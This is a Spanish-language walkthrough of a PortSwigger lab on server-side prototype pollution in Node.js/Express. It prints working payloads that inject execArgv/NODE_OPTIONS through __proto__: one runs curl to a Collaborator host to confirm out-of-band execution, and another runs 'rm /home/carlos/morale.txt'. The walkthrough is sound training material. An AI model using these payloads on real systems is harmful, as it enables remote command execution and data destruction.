---
title: Remote code execution via server-side prototype pollution
description: Laboratorio de Portswigger sobre Prototype Pollution
date: 2026-04-04 12:30:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger Labs
  - Prototype Pollution
tags:
  - Portswigger Labs
  - Prototype Pollution
  - Remote code execution via server-side prototype pollution
image:
  path: /assets/img/Portswigger/Portswigger.png
---

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` está `construido` sobre `Node.js` y el `framework Express`. Es `vulnerable` a `prototype pollution del lado del servidor` porque `fusiona de forma insegura la entrada controlada por el usuario en un objeto JavaScript del lado del servidor`. Debido a la `configuración` del `servidor`, es posible `contaminar` el `Object.prototype` de tal manera que se pueden `inyectar comandos` que luego se `ejecutan` en el `servidor`. Para `completar` el `laboratorio` debemos de `borrar el archivo /home/carlos/morale.txt`. Podemos `iniciar sesión` en nuestra `cuenta` con las `credenciales wiener:peter`

---

## Resolución

Al `acceder` a la `web` vemos `esto`

![](/assets/img/Prototype-Pollution-Lab-9/image_1.png)

`Pulsamos` en `My account` y nos `logueamos` con las `credenciales wiener:peter` adfasdf

![](/assets/img/Prototype-Pollution-Lab-9/image_2.png)

Vemos que podemos `acceder` al `admin panel`

![](/assets/img/Prototype-Pollution-Lab-9/image_3.png)

Si `pulsamos` sobre el `botón Submit` y `miramos` el `Logger` de `Burpsuite` vemos que se `realiza` esta `petición`

![](/assets/img/Prototype-Pollution-Lab-9/image_4.png)

Lo primero que vamos a hacer es `ver si podemos envenenar el prototipo`. Para ello, vamos a `usar` este `payload "__proto__":{"json spaces":10}`. Como podemos ver, `hemos conseguido envenenar el prototipo`

![](/assets/img/Prototype-Pollution-Lab-9/image_5.png)

Si `pulsamos` sobre `admin panel`, vemos que nos sale esto

![](/assets/img/Prototype-Pollution-Lab-9/image_6.png)

Si `pulsamos` sobre `Run maintenance jobs` nos `devuelve` este `mensaje`

![](/assets/img/Prototype-Pollution-Lab-9/image_7.png)

Si `capturamos` la `petición` con `Burpsuite` vemos esto

![](/assets/img/Prototype-Pollution-Lab-9/image_8.png)

Al tener que `borrar` un `archivo`, vamos a necesitar `ejecutar comandos`. Como he visto el `campo tasks`, he pensado que `puede estar corriendo un proceso hijos de node para cada tarea` . Para `verificar` esto podemos `usar` cualquiera de estos `payloads`:

```
"__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--inspect=TU-ID-COLLABORATOR.oastify.com\"\".oastify\"\".com"
}
```

```
"__proto__": {
  "execArgv": [
    "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
  ]
}
```

![](/assets/img/Prototype-Pollution-Lab-9/image_9.png)

Una vez hemos `envenenado` el `prototipo`, lo que tenemos que hacer es `hacer que se ejecuten los procesos hijos de node`. Para ello `pulsamos` en `Run maintenance jobs`

![](/assets/img/Prototype-Pollution-Lab-9/image_10.png)

![](/assets/img/Prototype-Pollution-Lab-9/image_11.png)

Una vez hecho esto, si nos `dirigimos` a `Burpsuite Collaborator` vemos que `nos han llegado 4 peticiones`

![](/assets/img/Prototype-Pollution-Lab-9/image_12.png)

El `siguiente paso` que vamos a hacer es `ejecutar comandos` y `eliminar el archivo morale.txt`

```
"__proto__": {
  "execArgv": [
    "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
  ]
}
```

![](/assets/img/Prototype-Pollution-Lab-9/image_13.png)

`Para que se ejecute el comando debemos de pulsar de nuevo sobre Run maintenance jobs`

![](/assets/img/Prototype-Pollution-Lab-9/image_14.png)

![](/assets/img/Prototype-Pollution-Lab-9/image_15.png)
